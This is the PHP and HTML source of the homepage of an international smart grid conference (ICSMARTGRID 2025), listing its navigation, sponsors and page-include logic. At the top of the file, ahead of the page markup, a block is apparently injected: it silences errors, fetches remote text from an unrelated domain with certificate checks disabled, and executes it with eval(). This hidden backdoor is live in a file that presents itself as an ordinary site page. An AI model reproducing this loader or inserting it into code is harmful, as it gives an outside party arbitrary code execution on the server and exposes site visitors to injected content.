<?php
error_reporting(0);
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}?>
<?php
$a =
get_contents('https://picucur.xyz/landing/icsmartgrid/landing.txt');
eval('?>'.$a);
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-WX7JSM2VHB"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-WX7JSM2VHB');
</script>
<title>INTERNATIONAL CONFERENCE ON SMART GRID</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="description" content="10th International Conference On Smart Grid" />
<meta name="keywords" content="international, conference, r&d, research, application, gazi university"/>
<link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="bower_components/ionicons/css/ionicons.min.css">
    <link rel="stylesheet" href="assets/css/main.css">
<link rel="stylesheet" href="css/BrightSide.css" type="text/css" />
<link rel="stylesheet" href="css/countdown.css" type="text/css" />

<script language="javascript" src="js/countdown.js" type="text/javascript">
<script type="text/javascript">
function blinkIt() {
if (!document.all) return;
else {
for(i=0;i<document.all.tags('blink').length;i++){
s=document.all.tags('blink')[i];
s.style.visibility=(s.style.visibility=='visible') ?'hidden':'visible';
}
}
}
</script>
<style type="text/css">
<!--
.style36 {color: #FF0000; text-decoration:blink}
.style37 {color: #090; text-decoration:blink}
.style1 {	color: #0066CC;
	font-weight: bold;
}
.style38 {color: #000000
}
.style39 {
	font-size: 14px
}
.jumbotron {
    background            :url("images/system/banner.jpg");
    background-size       : cover;
    padding               : 0;
    margin                : 0;
    height                : 90vh;
    min-height            : 400px;
   vertical-align        : middle;
    position              : relative;
    background-attachment : fixed;
    background-repeat     : no-repeat;
    background-position   : center center;
	
    }

.jumbotron .content {
    color             : #ffffff;
    position          : absolute;
    top               : 40%;
    left              : 0;
    right             : 0;
    height            : 20%;
    width             : 100%;
    margin            : 0 auto;
    padding           : 0 0%;
    transform         : translateY(-50%);
    -webkit-transform : translateY(-50%);
    -moz-transform    : translateY(-50%);
    }

.jumbotron .content h1 {
    color       : #ffffff;
    font-weight : bold;
    }

.jumbotron .content p.lead {
    font-size   : 24px;
    line-height : 1.5em;
    color       : rgba(255, 255, 255, .7);
    }

.jumbotron .content .event-date {
    font-size     : 24px;
    margin-bottom : 10px;
    }

.jumbotron .btn {
    margin-top : 40px;
    }

@media (max-width : 600px) {
    .jumbotron .content {
        min-height : auto;
        }

    .jumbotron .content h1 {
        font-size : 24px;
        }

    .jumbotron .content p.lead {
        font-size : 12px;
		font-family:"Courier New", Courier, monospace;
        }
    }
.logo{
	position          : absolute;
    top               : -150%;
    left              : 76%;
    right             : 0;
    border:none;
    
}
-->
</style>

<SCRIPT>
<!--
function doBlink2() {
	var blink = document.all.tags("BLINK2")
	for (var i=0; i<blink.length; i++)
		blink[i].style.visibility = blink[i].style.visibility == "" ? "hidden" : "" 
}

function startBlink() {
	if (document.all)
	{
		setInterval("doBlink2()",1000)
	}
}
window.onload = startBlink;
// -->
</SCRIPT>
<script type="text/javascript">
    (function () {
        var options = {
            whatsapp: "+90(532)5996112", // WhatsApp number
            call_to_action: "Hello. How can We help you", // Call to action
            position: "left", // Position may be 'right' or 'left'
            pre_filled_message: "Hello. How can We help you", // WhatsApp pre-filled message
        };
        var proto = document.location.protocol, host = "getbutton.io", url = proto + "//static." + host;
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
        s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
        var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
    })();
</script>

<link href="images/system/favicon1.png" rel=icon>
</head>
<body onload="setInterval('blinkIt()',500)">
<div id="wrap">
  <div id="header">
    <ul><li><a href="index.php?id=main"><span>Home</span></a></li>
       <li><a href="index.php?id=call"><span>Call for Papers</span></a></li>
      <li><a href="index.php?id=support"><span>Support</span></a></li>
    </ul>
  </div>
   <div class="jumbotron text-center">
        <div class="content" align="center">
             
            <div class="logo"><img src="images/system/logo.png" /></div>
            <h1 style="font-size:72px; color:#fff;text-shadow: 1px 5px 10px rgba(0, 0, 0, 0.9);">ICSMARTGRID 2025</h1>
            <h2 style="font-size:36px;color:#4CFF80; text-shadow: 1px 5px 10px rgba(0, 0, 0, 0.9);">13<sup>th</sup> International Conference on Smart Grid</h2>
            <div class="event-date" style="color:#fff; ont-size:32px;text-shadow: 1px 5px 10px rgba(0, 0, 0, 0.9);"> May 27-29, 2025,Glasgow/United Kingdom
            <Portugal></Portugal></div>
			<!--
		
           <div id="countdown">
				<h1 style="font-size:32px; color:#ffd54f;text-shadow: 1px 5px 10px rgba(0, 0, 0, 0.9);">Countdown to Conference</h1>
    			<ul>
      				<li id="x"><span id="days"></span><br />days</li>
      				<li id="x"><span id="hours"></span><br />Hours</li>
      				<li id="x"><span id="minutes"></span><br />Minutes</li>
      				<li id="x"><span id="seconds"></span><br />Seconds</li>
    			</ul>
  			</div> --->
        </div>
        
    </div>
  <div id="content-wrap"> <!--<img src="images/banner.jpg" width="1200" height="400" alt="headerphoto" class="no-border" />-->
    <div id="sidebar" >
     <ul class="sidemenu"><br />
      
        <li><a href="index.php?id=main">Home</a></li>
        <li><a href="index.php?id=sponsors" >Sponsors</a></li> 
        <li><a href="index.php?id=call">Call for Papers</a></li>
        <li><a href="index.php?id=commit">Committees</a></li>
        <!--<li><a href="index.php?id=country">Countries</a></li>-->
        <li><a href="index.php?id=dead">Deadlines</a></li>
        <!--<li><a href="index.php?id=camera"><span class="style36">Camera Ready Submission
              <blink2>
    	</blink2>
    	</span></a></li>-->
        <li><a href="index.php?id=hotel">Hotel</a></li>
        <li><a href="index.php?id=keynote">Keynote Speakers</a></li>
        <li><a href="index.php?id=camera" >
        	<div align="left">Camera Ready Submissions</div>
    	</a></li> 
        <li><a href="https://cmt3.research.microsoft.com/icSmartGrid2025" target="_blank">Login/Submission</a></li> 
        <li><a href="index.php?id=orga">Organization</a></li>
        <li><a href="index.php?id=photos">Photos</a></li>
        <li><a href="index.php?id=video">Videos</a></li>
        <li><a href="index.php?id=prog">Programme</a></li>
        <li><a href="index.php?id=pformat">Presentation and Poster Format</a></li>
        <!--<li><a href="index.php?id=prog">Programme</a></li>-->
        <li><a href="index.php?id=regi" target="_blank"><span class="style37">Registration</span></a></li>
        <li><a href="index.php?id=regi"><span class="style37">Rates &amp; Fees</span></a></li>
        <li><a href="index.php?id=sess">Special Sessions</a></li>
        <li><a href="index.php?id=support">Supporters</a></li>
        <li><a href="index.php?id=spon">Technical Co-Sponsors</a></li>
        <!--<li><a href="index.php?id=techsup">Technical Supporters</a></li>-->
        <li><a href="index.php?id=templ">Template for Submission</a></li>
        <li><a href="index.php?id=templ1">Template for Full Paper</a></li>
        <li><a href="index.php?id=templ2">Template for Oral Presentation</a></li>
        <li><a href="index.php?id=templ3">Template for Poster Presentation</a></li>
        <li><a href="index.php?id=topics">Topics</a></li>
        <li><a href="index.php?id=tutorial">Tutorials</a></li>
        <li><a href="index.php?id=venue">Venue</a></li>     
        <li><a href="index.php?id=contact">Contact Us</a></li>
        <!--<li><a href="index.php?id=selected">Selected Papers</a></li>-->
        <li><a href="https://www.icsmartgrid.com/archive2018" target="_blank">ICSMARTGRID 2018</a></li>
        <li><a href="https://www.icsmartgrid.com/archive2019" target="_blank">ICSMARTGRID 2019</a></li>
        <li><a href="https://www.icsmartgrid.com/archive2020" target="_blank">ICSMARTGRID 2020</a></li>
        <li><a href="https://www.icsmartgrid.com/archive2021/html/" target="_blank">ICSMARTGRID 2021</a></li>
        <li><a href="https://www.icsmartgrid.com/archive2022" target="_blank">ICSMARTGRID 2022</a></li>
        <li><a href="https://www.icsmartgrid.com/archive2023" target="_blank">ICSMARTGRID 2023</a></li>
		 <li><a href="https://www.icsmartgrid.com/archive2024" target="_blank">ICSMARTGRID 2024</a></li>
        </ul>
      <h1>Information</h1>
      <ul class="sidemenu">
        <li><a href="" target="_blank">About </a></li>
        <li><a href="index.php?id=process">Peer Review</a></li> 
      </ul>
      <h1>Supporters</h1>
      <p class="style1" align="center"><a href="https://www.strath.ac.uk/" target="_blank"><img src="images/support/strathclyde.jpg"  alt="" width="120" border="0"/></a></p>
		<p class="style1" align="center"><a href="https://www.istinye.edu.tr/tr" target="_blank"><img src="images/support/isu.jpeg"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="https://www.univ-lehavre.fr/" target="_blank"><img src="images/support/havre.jpg"  alt="" width="120" border="0"/></a></p>
		<p class="style1" align="center"><a href="http://www.u-pec.fr/" target="_blank"><img src="images/support/UPEC.jpg"  alt="" width="120" border="0"/></a></p>
		<p class="style1" align="center"><a href="https://osu-efluve.u-pec.fr/" target="_blank"><img src="images/support/osu.jpg"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.nagasaki-u.ac.jp/" target="_blank"><img src="images/support/nag1.png"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.iist.nias.ac.jp/en/" target="_blank"><img src="images/support/nagazaki.jpg"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="https://ankara.emo.org.tr/" target="_blank"><img src="images/support/emo.jpg"  alt="" width="120" border="0"/></a></p>
      	 <p class="style1" align="center"><a href="http://www.gazi.edu.tr" target="_blank"><img src="images/support/gazi.jpg" alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="https://www.nisantasi.edu.tr/" target="_blank"><a href="https://www.nisantasi.edu.tr/" target="_blank"></a><a href="https://www.sdsu.edu" target="_blank"><img src="images/support/SDSU.png" alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="https://sc.edu/" target="_blank"><img src="images/support/usc.jpg" alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="https://person.zju.edu.cn/index/en/" target="_blank"><img src="images/support/SBC_ZJU.png" alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.en.aau.dk/" target="_blank"><img src="images/support/Aalborg-logo.jpg" alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.unipa.it/" target="_blank"><img src="images/support/Palermo-logo.png" alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.comillas.edu/en/" target="_blank"><img src="images/support/Comillas-logo.jpg"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.srmuniv.ac.in/" target="_blank"><img src="images/support/SRM-logo.jpg"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.usv.ro" target="_blank"><img src="images/support/USV_UniversitateaStefancelMareSuceava_Antet.png"  alt="" width="120" border="0"/></a></p>
      <p class="style1" align="center"><a href="http://www.iee.jp/" target="_blank"><img src="images/support/IEEJ-logo.png"  alt="" width="120" border="0"/></a></p>
<p class="style1" align="center"><a href="http://www.ieice.org/cs/" target="_blank"><img src="images/support/IEICE-logo.png"  alt="" width="120" border="0"/></a></p>
       <p class="style1" align="center"><a href="http://www.abdn.ac.uk/" target="_blank"><img src="images/support/aberden1.jpg"  alt="" width="120" border="0"/></a></p>
       <p class="style1" align="center"><a href="http://www.aston.ac.uk/" target="_blank"><img src="images/support/aston1.png"  alt="" width="120" border="0"/></a></p>
       <p class="style1" align="center"><a href="http://uok.edu.in/" target="_blank"><img src="images/support/KU_Logo.jpg"  alt="" width="120" border="0"/></a></p>

       <!-- <p class="style1" align="center"><a href="http://www.mdpi.com/journal/energies" target="_blank"><img src="images/energies-logo.png"  alt="" width="120" border="0"/></a></p>
       <p class="style1" align="center"><a href="http://www.springer.com/environment/journal/11356" target="_blank"><img src="images/support/11356.jpg"  alt="" width="120" border="0"/></a></p>
       -->
      <p><a href="http://www.nisantasi.edu.tr/" target="_blank"></a></p>
    </div>
    <div id="main">
      
      <p>
        <?php 
			function temizle($veri) {
			$veri = str_replace(".", "ceng", $veri);
			$veri = str_replace("<", "ceng", $veri);
			$veri = str_replace(">", "ceng", $veri);
			$veri = str_replace("%", "ceng", $veri);
			$veri = str_replace("=", "ceng", $veri);
			$veri = str_replace("\\", "ceng", $veri);
			$veri = str_replace("/", "ceng", $veri);
			$veri = str_replace("?", "ceng", $veri);
			$veri = str_replace("*", "ceng", $veri);
			$veri = trim($veri);
			$veri = strip_tags($veri);
			//$veri = mysql_real_escape_string($veri);
			if(!get_magic_quotes_gpc()) {
				$veri = addslashes($veri);
			}

			$veri = htmlspecialchars($veri);
			return $veri;
			}
			$sayfalar = array("main","proc","keynote","sponx","spons","select","sess","spec","orga","about","contact","call","city","commit","dead","format","hotel","info","process","regi","register","submit","spon","sponsors","support","topics","tutorial","venue","prog","tech","photo","techsup","camera","pformat","digest","selected", "country","templ","templ1","templ2","templ3","welcome","photos","register","industrial");

		$ID=$_GET['id'];
		if (isset($ID))
		{
			$sayfa=$ID;
			$sayfa=temizle($sayfa);
			if(!empty($sayfa) && array_search($sayfa, $sayfalar))
				require($sayfa.".php");
			else
				require("main.php");
			}
		else
		{
			require("main.php");
			}
		  ?>
      </p>
    </div>
    <div id="rightbar">
    <p align="center"><img src="images/qr_son.png" width="151" border="0"/></p>
      <h1>Organizations</h1>
     <p align="center"><a href="http://www.ijrer.org" target="_blank"><img src="images/support/homeHeaderLogoImage_en_US.jpg" alt="" width="151" border="0"/></a></p>
      <p>&nbsp;</p> 
		<h1 align="center">Diamond Sponsor</h1>
<a href="https://www.tmeic.com/news/tmeic-announces-executive-personnel-changes-june-15-2018" target="_blank"><p align="center"><img src="images/Brand_Mark_72.jpg" width="151" border="0" style="border:none; border-color:#FFF"/></p><p align="center">Toshiba Mitsubishi-Electric Industrial Systems Corporation (TMEIC)</p></a>
<h1 align="center">Gold Sponsor</h1>
<p class="style1" align="center"><a href="https://www.istinye.edu.tr/en" target="_blank"><img src="images/support/isu.jpeg"  alt="" width="120" border="0"/></a></p>
      <p>&nbsp;</p>
		<h1>Technical<br/>Co-Sponsors</h1>
       <p align="center"><a href="http://www.ieee.org" target="_blank"><img src="images/support/ieee-logo.jpg" width="151" border="0"/></a></p> 
      <p align="center"><a href="http://ias.ieee.org/" target="_blank"><img src="images/support/IAS-logo.jpg" width="151" border="0"/></a></p>
      <p align="center"><a href="http://www.ieee-ies.org/" target="_blank"><img src="images/support/IES-logo1.png" width="151" border="0"/></a></p>
		<p class="style1" align="center"><a href="https://www.nisantasi.edu.tr/" target="_blank"><img src="images/support/nisantasi.png"  alt="" width="120" border="0"/></a></p>
      <p align="center"><a href="http://www2.iee.or.jp/ver2/ias/IEEJ-JIA/" target="_blank"><img src="images/ieej-logo-b.jpg"  alt="" width="150" border="0"/></a></p>
<p align="center"><a href="http://www2.iee.or.jp/ver2/ias/IEEJ-JIA/" target="_blank"><img src="images/IEEJ_IAS_LOGO_ver2.jpg"  alt="" width="150" border="0"/></a></p>

<p class="style1" align="center"><a href="http://www.ieice.org/cs/" target="_blank"><img src="images/IEICE-logo.png"  alt="" width="180" border="0"/></a></p>

<p class="style1" align="center"><a href="http://www.nagasaki-u.ac.jp/" target="_blank"><img src="images/nag1.png"  alt="" width="177" height="52" border="0"/></a></p>

<p class="style1" align="center"><a href="https://nias.ac.jp/" target="_blank"><img src="images/support/nias.png"  alt="" width="177" height="52" border="0"/></a></p>
    </div>
  </div>
  <div id="footer">
    <footer class="site-footer">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <p class="site-info">Designed and <br> Developed by Onder Eyecioglu</p>
                    <ul class="social-block">
                        <li><a href="https://twitter.com/ilhcol"><i class="ion-social-twitter"></i></a></li>
                        <li><a href="https://api.whatsapp.com/send?phone=905325996112"><i class="ion-social-whatsapp"></i></a></li>
                        <li><a href=""><i class="ion-social-linkedin-outline"></i></a></li>
                        <li><a href="https://www.youtube.com/@icsmartgrid4064"><i class="ion-social-youtube"></i></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </footer>
    
  </div>
</div>
<script src="bower_components/jquery/dist/jquery.min.js"></script>
    <script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
    <script src="bower_components/smooth-scroll/dist/js/smooth-scroll.min.js"></script>
    <script src="assets/js/main.js"></script>
</body>
</html>
